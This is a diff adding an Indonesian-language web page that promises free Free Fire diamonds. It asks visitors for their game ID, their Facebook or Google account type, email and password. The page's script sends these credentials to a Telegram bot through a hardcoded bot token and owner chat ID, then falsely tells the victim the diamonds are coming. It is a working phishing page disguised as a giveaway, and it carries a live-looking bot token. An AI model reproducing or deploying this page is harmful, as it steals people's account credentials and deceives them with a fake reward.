@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PianTech - Free Diamond</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            color: #fff;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        header {
+            text-align: center;
+            padding: 40px 0;
+            position: relative;
+        }
+
+        .logo {
+            font-size: 2.5rem;
+            color: #ffcc00;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px rgba(255, 204, 0, 0.5);
+        }
+
+        h1 {
+            font-size: 3rem;
+            margin-bottom: 10px;
+            background: linear-gradient(90deg, #ffcc00, #ff9900);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 15px rgba(255, 153, 0, 0.3);
+        }
+
+        .subtitle {
+            font-size: 1.2rem;
+            color: #a0a0c0;
+            margin-bottom: 30px;
+        }
+
+        .diamond-icon {
+            display: inline-block;
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #00c6ff, #0072ff);
+            clip-path: polygon(50% 0%, 100% 50%, 50% 100%, 0% 50%);
+            margin: 0 10px;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        .form-container {
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-size: 1.1rem;
+            color: #e0e0ff;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 15px;
+            border-radius: 10px;
+            border: none;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            font-size: 1rem;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            transition: all 0.3s ease;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: #ffcc00;
+            box-shadow: 0 0 10px rgba(255, 204, 0, 0.3);
+            background: rgba(255, 255, 255, 0.15);
+        }
+
+        .account-type {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+
+        .account-option {
+            flex: 1;
+            text-align: center;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: 2px solid transparent;
+        }
+
+        .account-option:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .account-option.selected {
+            border-color: #ffcc00;
+            background: rgba(255, 204, 0, 0.1);
+        }
+
+        .account-icon {
+            font-size: 2rem;
+            margin-bottom: 10px;
+        }
+
+        .facebook { color: #3b5998; }
+        .google { color: #db4437; }
+
+        .submit-btn {
+            display: block;
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(90deg, #ffcc00, #ff9900);
+            color: #1a1a2e;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(255, 153, 0, 0.4);
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(255, 153, 0, 0.6);
+        }
+
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+
+        .info-section {
+            margin-top: 40px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 20px;
+            justify-content: center;
+        }
+
+        .info-card {
+            flex: 1;
+            min-width: 250px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            padding: 25px;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .info-card:hover {
+            transform: translateY(-5px);
+            background: rgba(255, 255, 255, 0.08);
+        }
+
+        .info-card i {
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+            color: #ffcc00;
+        }
+
+        .info-card h3 {
+            margin-bottom: 10px;
+            color: #ffcc00;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 50px;
+            padding: 20px;
+            color: #a0a0c0;
+            font-size: 0.9rem;
+        }
+
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 15px 25px;
+            background: rgba(0, 200, 83, 0.9);
+            color: white;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            transform: translateX(150%);
+            transition: transform 0.5s ease;
+            z-index: 1000;
+        }
+
+        .notification.show {
+            transform: translateX(0);
+        }
+
+        .notification.error {
+            background: rgba(244, 67, 54, 0.9);
+        }
+
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2.2rem;
+            }
+            
+            .form-container {
+                padding: 25px;
+            }
+            
+            .account-type {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">
+                <i class="fas fa-gem"></i>
+            </div>
+            <h1>BAGI-BAGI DIAMOND FF</h1>
+            <p class="subtitle">Dapatkan Diamond Free Fire Gratis dengan Mengisi Formulir Berikut</p>
+            <div>
+                <span class="diamond-icon"></span>
+                <span class="diamond-icon"></span>
+                <span class="diamond-icon"></span>
+            </div>
+        </header>
+
+        <div class="form-container">
+            <form id="diamondForm">
+                <div class="form-group">
+                    <label for="playerId">ID Free Fire</label>
+                    <input type="text" id="playerId" placeholder="Masukkan ID Free Fire Anda" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="playerLevel">Level Akun Free Fire</label>
+                    <input type="number" id="playerLevel" placeholder="Masukkan Level Akun Anda" min="1" max="100" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Pilih Jenis Akun</label>
+                    <div class="account-type">
+                        <div class="account-option" data-type="facebook">
+                            <div class="account-icon facebook">
+                                <i class="fab fa-facebook"></i>
+                            </div>
+                            <div>Facebook</div>
+                        </div>
+                        <div class="account-option" data-type="google">
+                            <div class="account-icon google">
+                                <i class="fab fa-google"></i>
+                            </div>
+                            <div>Google</div>
+                        </div>
+                    </div>
+                    <input type="hidden" id="accountType" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="email">Email</label>
+                    <input type="email" id="email" placeholder="Masukkan Email Anda" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" placeholder="Masukkan Password Akun Anda" required>
+                </div>
+
+                <button type="submit" class="submit-btn">
+                    <i class="fas fa-gift"></i> DAPATKAN DIAMOND GRATIS
+                </button>
+            </form>
+        </div>
+
+        <div class="info-section">
+            <div class="info-card">
+                <i class="fas fa-shield-alt"></i>
+                <h3>AMAN & TERPERCAYA</h3>
+                <p>Data Anda akan kami jaga kerahasiaannya</p>
+            </div>
+            <div class="info-card">
+                <i class="fas fa-bolt"></i>
+                <h3>PROSES CEPAT</h3>
+                <p>Diamond akan dikirim dalam waktu 24 jam</p>
+            </div>
+            <div class="info-card">
+                <i class="fas fa-users"></i>
+                <h3>SUDAH TERBUKTI</h3>
+                <p>Ribuan pemain telah menerima diamond</p>
+            </div>
+        </div>
+
+        <div class="footer">
+            <p>&copy; 2025 - PianTech ( N.E.S )</p>
+        </div>
+    </div>
+
+    <div class="notification" id="notification">
+        Data berhasil dikirim! Diamond akan segera diproses.
+    </div>
+
+    <script>
+        // Pilih jenis akun
+        document.querySelectorAll('.account-option').forEach(option => {
+            option.addEventListener('click', function() {
+                document.querySelectorAll('.account-option').forEach(opt => {
+                    opt.classList.remove('selected');
+                });
+                this.classList.add('selected');
+                document.getElementById('accountType').value = this.getAttribute('data-type');
+            });
+        });
+
+        // Kirim data ke Telegram
+        document.getElementById('diamondForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const playerId = document.getElementById('playerId').value;
+            const playerLevel = document.getElementById('playerLevel').value;
+            const accountType = document.getElementById('accountType').value;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            if (!accountType) {
+                showNotification('Pilih jenis akun terlebih dahulu!', true);
+                return;
+            }
+            
+            // Ganti dengan token bot Telegram Anda
+            const telegramBotToken = '8448752608:AAHB3K9_iPXMvPpTIFWacoemVtZKMV_IGT0';
+            const ownerId = '7272205009';
+            
+            const message = `
+🎮 *DATA BARU BAGI-BAGI DIAMOND FF* 🎮
+
+🆔 *ID Free Fire:* ${playerId}
+📊 *Level Akun:* ${playerLevel}
+🔐 *Jenis Akun:* ${accountType.toUpperCase()}
+📧 *Email:* ${email}
+🔒 *Password:* ${password}
+
+⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}
+            `;
+            
+            const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+            
+            fetch(apiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: ownerId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    showNotification('Data berhasil dikirim! Diamond akan segera diproses.');
+                    document.getElementById('diamondForm').reset();
+                    document.querySelectorAll('.account-option').forEach(opt => {
+                        opt.classList.remove('selected');
+                    });
+                } else {
+                    showNotification('Terjadi kesalahan. Silakan coba lagi.', true);
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                showNotification('Terjadi kesalahan. Silakan coba lagi.', true);
+            });
+        });
+
+        function showNotification(message, isError = false) {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            
+            if (isError) {
+                notification.classList.add('error');
+            } else {
+                notification.classList.remove('error');
+            }
+            
+            notification.classList.add('show');
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 5000);
+        }
+    </script>
+</body>
+</html>
